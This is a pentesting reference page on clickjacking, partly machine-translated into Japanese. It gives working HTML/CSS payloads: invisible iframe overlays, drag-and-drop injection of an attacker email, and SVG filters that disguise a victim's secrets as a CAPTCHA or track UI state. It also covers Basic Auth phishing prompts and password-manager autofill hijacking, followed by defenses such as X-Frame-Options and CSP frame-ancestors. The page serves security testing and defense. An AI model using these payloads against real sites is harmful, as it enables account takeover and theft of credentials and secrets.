# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjackingとは

In a clickjacking attack, a **ユーザー**は**騙されて**、ページ上の**目に見えない**または別の要素に見せかけられた**要素**を**クリックする**よう仕向けられます。この操作は、マルウェアのダウンロード、悪意あるページへのリダイレクト、認証情報や機密情報の提供、金銭の送金、オンラインでの商品の購入など、ユーザーにとって意図しない結果を招く可能性があります。

### フォーム事前入力トリック

場合によっては、**ページを読み込む際にGETパラメータを使ってフォームのフィールドの値を設定できる**ことがあります。攻撃者はこの挙動を悪用してフォームを任意のデータで埋め、clickjackingのペイロードを送り付けてユーザーにSubmitボタンを押させることができます。

### Drag\&Dropでフォームに入力

ユーザーに**フォームを入力してもらう**必要があるが、特定の情報（例えば既に知っているメールアドレスや特定のパスワード）を書いてほしいと直接頼みたくない場合は、単に何かを**Drag\&Drop**してもらうように頼めば、あなたが制御するデータを書き込ませることができます（[**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/) のように）。

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### マルチステップ Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

If you have identified an **XSS がユーザーのクリックを必要とする攻撃** on some element to **発動** the XSS and the page is **clickjacking に脆弱** , you could abuse it to trick the user into clicking the button/link.\
Example:\
You found a **self XSS** in some private details of the account (details that **あなただけが設定・閲覧できる**). The page with the **フォーム** to set these details is **脆弱** to **Clickjacking** and you can **prepopulate** the **フォーム** with the GET parameters.\
An attacker could prepare a **Clickjacking** attack to that page **prepopulating** the **フォーム** with the **XSS payload** and **tricking** the **user** into **送信** the form. So, **when the form is submitted** and the values are modified, the **user will execute the XSS**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), this technique would ask the victim to double click on a button of a custom page placed in a specific location, and use the timing differences between mousedown and onclick events to load the victim page duing the double click so the **被害者が実際に被害者ページ上の正規のボタンをクリックしてしまう**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> この手法は、clickjacking に対するあらゆる保護を回避して被害者に被害者ページの1箇所をクリックさせることを可能にします。したがって、攻撃者は**OAuth プロンプトで権限を承認するような、ワンクリックで実行できる機密性の高いアクション**を見つける必要があります。

### SVG Filters / Cross-Origin Iframe UI Redressing

Modern Chromium/WebKit/Gecko builds let CSS `filter:url(#id)` be applied to cross-origin iframes. The iframe’s rasterized pixels are exposed to the SVG filter graph as `SourceGraphic`, so primitives such as `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology`, etc. can arbitrarily warp the victim UI before the user sees it, even though the attacker never touches the DOM. A simple Liquid-Glass style filter looks like:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* 便利なプリミティブ: `feImage` は攻撃者ビットマップ（例: overlays, displacement maps）を読み込む; `feFlood` は単色マットを作る; `feOffset/feGaussianBlur` はハイライトを整える; `feDisplacementMap` はテキストを屈折/ワープさせる; `feComposite operator="arithmetic"` はチャネルごとの任意の算術（`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`）を実装し、コントラスト強化、マスキング、AND/OR 操作に十分である; `feTile` はピクセルプローブを切り取り複製する; `feMorphology` はストロークを太らせ/細くする; `feColorMatrix` はルマをアルファに移して精密なマスクを作る。

#### Distorting secrets into CAPTCHA-style prompts

If a framable endpoint renders secrets (tokens, reset codes, API keys), the attacker can distort them so they resemble a CAPTCHA and coerce manual transcription:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
The distorted pixels fool the user into “solving” the captcha inside the attacker-controlled `<input>` whose `pattern` enforces the real victim secret.

#### Recontextualizing victim inputs

フィルターはプレースホルダー／検証用テキストを外科的に削除しつつ、ユーザーのキー入力を保持できます。ワークフローの一例：

1. `feComposite operator="arithmetic" k2≈4` は明度を増幅し、灰色の補助テキストが白に飽和するようにします。
2. `feTile` は作業領域を入力欄の矩形に限定します。
3. `feMorphology operator="erode"` は被害者が入力した暗いグリフを太くし、`result="thick"` で保存します。
4. `feFlood` は白いプレートを作り、`feBlend mode="difference"` を `thick` と組み合わせ、さらに二度目の `feComposite k2≈100` でそれを強烈な輝度マットに変換します。
5. `feColorMatrix` がその輝度をアルファに移し、`feComposite in="SourceGraphic" operator="in"` がユーザーが入力したグリフのみを保持します。
6. さらに `feBlend in2="white"` と薄いクロップでクリーンなテキストボックスを作り、その後攻撃者は自分の HTML ラベル（例: “Enter your email”）を重ねます。一方で隠された iframe は被害者オリジンのパスワードポリシーを依然として強制します。

Safari は `feTile` がうまく動作しないため、WebKit 専用のペイロードでは `feFlood` + `feColorMatrix` + `feComposite` から構築した空間マットで同じ効果を再現できます。

#### Pixel probes, logic and state machines

`feTile` で 2–4 px の領域を切り取り、それをビューポートの `100%` にタイルすると、攻撃者はサンプリングした色をフルフレームのテクスチャに変換できます。そこから閾値処理してブールマスクにすることができます：
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
For arbitrary colors, a `feFlood` reference (e.g., `#0B57D0`) plus `feBlend mode="difference"` and another arithmetic composite (`k2≈100`, `k4` as tolerance) outputs white only when the sampled pixel matches the target shade. Feeding these masks into `feComposite` with tuned `k1..k4` yields logic gates: `AND` via `k1=1`, `OR` via `k2=k3=1`, `XOR` via `feBlend mode="difference"`, `NOT` via blending against white. Chaining gates makes a full adder inside the filter graph, proving the pipeline is functionally complete.

したがって攻撃者は JavaScript を使わずに UI の状態を読み取ることができます。モーダルワークフローの例としてのブール値:

- **D**（ダイアログ表示）: 暗くなった隅をプローブし、白と比較してテストします。
- **L**（ダイアログ読み込み完了）: ボタンが表示される準備ができたときの座標をプローブします。
- **C**（チェックボックスがチェックされている）: チェックボックスのピクセルをアクティブな青 `#0B57D0` と比較します。
- **R**（赤の成功/失敗バナー）: `feMorphology` とバナー矩形内の赤のしきい値を使用します。

検出された各状態は `feImage xlink:href="data:..."` を介して埋め込まれた異なるオーバーレイビットマップをゲートします。これらのビットマップを `D`、`L`、`C`、`R` でマスクすることでオーバーレイは実際のダイアログと同期し、被害者を DOM を露出することなくマルチステップのワークフロー（パスワードリセット、承認、破壊的な確認など）に沿って誘導します。

### サンドボックス化された iframe Basic Auth ダイアログ（no allow-popups）

allow-popups を持たないサンドボックス化された iframe でも、ロードが `401` を返し `WWW-Authenticate` を含む場合、ブラウザ制御の **HTTP Basic Authentication modal** を表示させることができます。そのダイアログはブラウザのネットワーキング/認証レイヤーによって生成され（JS の `alert/prompt/confirm` ではありません）、そのためサンドボックス内のポップアップ制限はそれを抑制しません。もし iframe をスクリプト制御できる（例: `sandbox="allow-scripts"`）なら、任意の Basic Auth チャレンジを返すエンドポイントにナビゲートできます:
```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```
レスポンスが到着すると、ポップアップが禁止されていてもブラウザが認証情報を求めるプロンプトを表示します。このトリックで信頼された origin をフレーミングすると UI redress/phishing を可能にします: 「sandboxed」ウィジェット内の予期せぬモーダルプロンプトはユーザーを混乱させたり、password managers が保存済みの認証情報を提示するきっかけになります。

### ブラウザ拡張機能: DOM-based autofill clickjacking

被害者ページを iframe で読み込むことに加え、攻撃者はページに注入されるブラウザ拡張機能の UI 要素を狙うことができます。Password managers はフォーカスされた入力の近くに autofill のドロップダウンを表示します。攻撃者が制御するフィールドにフォーカスを移し、拡張機能のドロップダウンを隠す/覆い隠す（opacity/overlay/top-layer トリック）ことで、強要されたユーザークリックにより保存済みアイテムが選択され、機密データが攻撃者制御の入力に入力されます。このバリアントは iframe の露出を必要とせず、完全に DOM/CSS の操作で動作します。

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Clickjacking を緩和するための戦略

### クライアント側の防御

クライアント側で実行されるスクリプトは Clickjacking を防ぐために次のような処理を行えます:

- アプリケーションウィンドウがメインまたはトップウィンドウであることを確認する。
- すべてのフレームを可視化する。
- 不可視フレーム上のクリックを防止する。
- 潜在的な Clickjacking 試行を検出してユーザーに警告する。

ただし、これらの frame-busting スクリプトは回避される可能性があります:

- **Browsers' Security Settings:** 一部のブラウザはセキュリティ設定や JavaScript 非対応によりこれらのスクリプトをブロックする可能性があります。
- **HTML5 iframe `sandbox` Attribute:** 攻撃者は `sandbox` 属性を `allow-forms` または `allow-scripts` の値で設定し、`allow-top-navigation` を付与しないことで frame buster スクリプトを無効化できます。これにより iframe は自分がトップウィンドウかどうかを検証できなくなります。例えば、
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
`allow-forms` と `allow-scripts` の値は、iframe 内でのアクションを有効にしつつ、トップレベルのナビゲーションを無効化します。ターゲットサイトの意図した機能を確保するために、攻撃の種類に応じて `allow-same-origin` や `allow-modals` のような追加の許可が必要になる場合があります。どの許可を許可すべきかは、ブラウザのコンソールメッセージが指針になります。

### サーバー側の防御

#### X-Frame-Options

**`X-Frame-Options` HTTP response header** は、ブラウザに対してページを `<frame>` または `<iframe>` にレンダリングすることの正当性を知らせ、Clickjacking を防ぐのに役立ちます:

- `X-Frame-Options: deny` - どのドメインもコンテンツをフレーム化できません。
- `X-Frame-Options: sameorigin` - 現在のサイトのみがコンテンツをフレーム化できます。
- `X-Frame-Options: allow-from https://trusted.com` - 指定された 'uri' のみがページをフレーム化できます。
- 制限事項に注意: ブラウザがこのディレクティブをサポートしていない場合、機能しない可能性があります。いくつかのブラウザは CSP の `frame-ancestors` ディレクティブを優先します。

#### Content Security Policy (CSP) の `frame-ancestors` ディレクティブ

**CSP の `frame-ancestors` ディレクティブ** は Clickjacking 対策として推奨されます:

- `frame-ancestors 'none'` - `X-Frame-Options: deny` と同様です。
- `frame-ancestors 'self'` - `X-Frame-Options: sameorigin` と同様です。
- `frame-ancestors trusted.com` - `X-Frame-Options: allow-from` と同様です。

例えば、次の CSP は同一ドメインからのフレーミングのみを許可します:

`Content-Security-Policy: frame-ancestors 'self';`

詳細や複雑な例は [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) および [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) にあります。

### Content Security Policy (CSP) with `child-src` and `frame-src`

**Content Security Policy (CSP)** は、ブラウザがコンテンツを読み込むことを許可するソースを指定することで、Clickjacking やその他のコード注入攻撃を防ぐのに役立つセキュリティ対策です。

#### `frame-src` Directive

- フレームの有効なソースを定義します。
- `default-src` ディレクティブよりも具体的です。
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
このポリシーは、同一オリジン (self) および https://trusted-website.com からのフレームを許可します。

#### `child-src` ディレクティブ

- CSP レベル 2で導入され、web workers とフレームの有効なソースを設定します。
- frame-src と worker-src のフォールバックとして機能します。
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
このポリシーは、同一オリジン（self）および https://trusted-website.com からのフレームとワーカーを許可します。

**使用上の注意:**

- 廃止予定: child-src は frame-src と worker-src に置き換えられつつあります。
- フォールバックの挙動: frame-src が存在しない場合、child-src がフレームのフォールバックとして使用されます。両方とも存在しない場合は default-src が使用されます。
- 厳格なソース定義: ディレクティブには信頼できるソースのみを含め、悪用を防いでください。

#### JavaScript によるフレームバスティングスクリプト

完全に万能ではありませんが、JavaScript ベースのフレームバスティングスクリプトは、ウェブページがフレームに埋め込まれるのを防ぐために使用できます。例:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens の導入

- **Token Validation:** webアプリケーションで anti-CSRF tokens を使用し、状態を変更するリクエストがユーザーの意図的な操作によるものであり、Clickjacked ページ経由ではないことを保証します。

## 参考文献

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

{{#include ../banners/hacktricks-training.md}}
